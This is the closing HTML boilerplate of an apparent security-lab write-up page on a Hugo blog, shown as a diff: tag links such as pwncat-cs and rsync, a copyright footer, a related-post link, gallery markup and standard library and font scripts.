+            <a href="/tags/pwncat-cs/">Pwncat-Cs</a>
+        
+            <a href="/tags/misconfigurations/">Misconfigurations</a>
+        
+            <a href="/tags/rsync/">Rsync</a>
+        
+            <a href="/tags/php/">Php</a>
+        
+            <a href="/tags/sqlite/">Sqlite</a>
+        
+            <a href="/tags/ftp/">Ftp</a>
+        
+            <a href="/tags/ssh/">Ssh</a>
+        
+    </section>
+
+
+    
+    <section class="article-copyright">
+        <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-copyright" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="12" cy="12" r="9" />
+  <path d="M14.5 9a3.5 4 0 1 0 0 6" />
+</svg>
+
+
+
+        <span>Licensed under CC BY-NC-SA 4.0</span>
+    </section>
+    </footer>
+
+
+    
+</article>
+
+    
+
+    
+
+<aside class="related-content--wrapper">
+    <h2 class="section-title">Related content</h2>
+    <div class="related-content">
+        <div class="flex article-list--tile">
+            
+                
+<article class="">
+    <a href="/p/vulnlab-build-writeup/">
+        
+        
+
+        <div class="article-details">
+            <h2 class="article-title">Vulnlab :: Build Writeup</h2>
+        </div>
+    </a>
+</article>
+
+            
+        </div>
+    </div>
+</aside>
+
+     
+    
+        
+    
+
+    <footer class="site-footer">
+    <section class="copyright">
+        &copy; 
+        
+            2020 - 
+        
+        2025 qrxnz
+    </section>
+    
+    <section class="powerby">
+        Built with <a href="https://gohugo.io/" target="_blank" rel="noopener">Hugo</a> <br />
+        Theme <b><a href="https://github.com/CaiJimmy/hugo-theme-stack" target="_blank" rel="noopener" data-version="3.29.0">Stack</a></b> designed by <a href="https://jimmycai.com" target="_blank" rel="noopener">Jimmy</a>
+    </section>
+</footer>
+
+
+    
+<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">
+
+    
+    <div class="pswp__bg"></div>
+
+    
+    <div class="pswp__scroll-wrap">
+
+        
+        <div class="pswp__container">
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+        </div>
+
+        
+        <div class="pswp__ui pswp__ui--hidden">
+
+            <div class="pswp__top-bar">
+
+                
+
+                <div class="pswp__counter"></div>
+
+                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
+
+                <button class="pswp__button pswp__button--share" title="Share"></button>
+
+                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
+
+                <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>
+
+                
+                
+                <div class="pswp__preloader">
+                    <div class="pswp__preloader__icn">
+                        <div class="pswp__preloader__cut">
+                            <div class="pswp__preloader__donut"></div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
+                <div class="pswp__share-tooltip"></div>
+            </div>
+
+            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
+            </button>
+
+            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
+            </button>
+
+            <div class="pswp__caption">
+                <div class="pswp__caption__center"></div>
+            </div>
+
+        </div>
+
+    </div>
+
+</div><script 
+                src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.js"integrity="sha256-ePwmChbbvXbsO02lbM3HoHbSHTHFAeChekF1xKJdleo="crossorigin="anonymous"
+                defer
+                >
+            </script><script 
+                src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe-ui-default.min.js"integrity="sha256-UKkzOn/w1mBxRmLLGrSeyB4e1xbrp4xylgAWb3M42pU="crossorigin="anonymous"
+                defer
+                >
+            </script><link 
+                rel="stylesheet" 
+                href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/default-skin/default-skin.min.css"crossorigin="anonymous"
+            ><link 
+                rel="stylesheet" 
+                href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.css"crossorigin="anonymous"
+            >
+
+            </main>
+        </div>
+        <script 
+                src="https://cdn.jsdelivr.net/npm/node-vibrant@3.1.6/dist/vibrant.min.js"integrity="sha256-awcR2jno4kI5X0zL8ex0vi2z&#43;KMkF24hUW8WePSA9HM="crossorigin="anonymous"
+                
+                >
+            </script><script type="text/javascript" src="/ts/main.26c5054a986a3b4c017d1e578533fe8507ebd2942734bae37ce7906ad6e3bd9f.js" defer></script>
+<script>
+    (function () {
+        const customFont = document.createElement('link');
+        customFont.href = "https://fonts.googleapis.com/css2?family=Lato:wght@300;400;700&display=swap";
+
+        customFont.type = "text/css";
+        customFont.rel = "stylesheet";
+
+        document.head.appendChild(customFont);
+    }());
+</script>
+
+    </body>
+</html>
